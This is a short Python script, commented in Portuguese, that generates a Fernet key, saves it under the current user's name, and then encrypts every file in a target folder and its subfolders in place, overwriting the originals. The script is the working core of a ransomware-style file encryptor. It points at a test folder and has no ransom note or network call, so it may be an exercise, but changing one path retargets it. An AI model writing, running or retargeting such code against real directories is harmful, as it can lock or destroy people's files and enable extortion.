import os
from cryptography.fernet import Fernet

# Gere uma chave para criptografia
def generate_key():
    return Fernet.generate_key()

# Salve a chave em um arquivo
def save_key(key, filename):
    with open(filename, 'wb') as file:
        file.write(key)

# Carregue a chave de um arquivo
def load_key(filename):
    with open(filename, 'rb') as file:
        return file.read()

# Criptografar um arquivo com a chave
def encrypt_file(key, filename):
    fernet = Fernet(key)
    with open(filename, 'rb') as file:
        data = file.read()
    encrypted_data = fernet.encrypt(data)
    with open(filename, 'wb') as file:
        file.write(encrypted_data)

# Pegar nome do usuario para a chave
def get_username():
    if os.name == 'posix':  # Verifica se é um sistema Unix-like (Linux, macOS)
        return os.getenv('USER')
    elif os.name == 'nt':  # Verifica se é o Windows
        return os.getenv('USERNAME')
    else:
        return "noname"


# Criar uma chave e salvar em um arquivo
key = generate_key()
if __name__ == "__main__":
    username = get_username()
save_key(key, f"{username}.key")

# Pasta que você deseja criptografar
pasta_alvo = './teste'

# Percorra todos os arquivos na pasta e subpastas e criptografe-os
for root, _, files in os.walk(pasta_alvo):
    for file in files:
        file_path = os.path.join(root, file)
        encrypt_file(key, file_path)

print('Chave criada com sucesso')
print('Todos os arquivos foram criptografados')
